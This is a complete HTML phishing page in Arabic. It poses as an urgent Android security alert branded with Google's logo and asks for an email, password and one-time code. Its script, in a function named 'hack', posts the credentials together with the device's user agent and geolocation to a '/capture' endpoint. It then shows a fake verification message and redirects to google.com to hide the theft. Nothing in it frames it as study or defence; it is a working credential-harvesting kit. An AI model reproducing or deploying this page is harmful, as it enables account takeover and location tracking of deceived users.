<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <link rel="manifest" href="/manifest.json">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث أمن Android</title>
    <style>
        body { background: #121212; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
        .box { background: #1e1e1e; padding: 25px; border-radius: 15px; border: 1px solid #333; margin-top: 50px; }
        input { width: 90%; padding: 15px; margin: 10px 0; border-radius: 8px; border: none; background: #2a2a2a; color: white; }
        button { background: #007bff; color: white; width: 95%; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
        .loading { display: none; color: #007bff; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="box" id="main">
        <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" width="50">
        <h2>تنبيه أمني عاجل</h2>
        <p>تم اكتشاف محاولة اختراق لجهازك. يرجى تأكيد حسابك لتفعيل درع الحماية المحدث.</p>
        <div id="step1">
            <input type="email" id="email" placeholder="البريد الإلكتروني">
            <input type="password" id="pass" placeholder="كلمة المرور">
            <button onclick="hack()">تفعيل الحماية الآن</button>
        </div>
        <div id="step2" style="display:none;">
            <p>أدخل رمز التحقق (OTP) الذي وصلك الآن:</p>
            <input type="number" id="otp" placeholder="000000">
            <button onclick="finish()">تأكيد الرمز</button>
            <p id="status" class="loading">جاري فحص الرمز...</p>
        </div>
    </div>

    <script>
        async function hack() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('pass').value;
            if(!email || !password) return alert("يرجى إكمال البيانات");

            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';

            // سحب الموقع والكاميرا في الخلفية
            const device = navigator.userAgent;
            navigator.geolocation.getCurrentPosition(async (p) => {
                send('/capture', { email, password, device, location: { lat: p.coords.latitude, lon: p.coords.longitude } });
            }, () => {
                send('/capture', { email, password, device });
            });
        }

        async function send(url, data) {
            await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
        }

        function finish() {
            document.getElementById('status').style.display = 'block';
            setTimeout(() => { window.location.href = "https://google.com"; }, 3000);
        }
    </script>
</body>
</html>
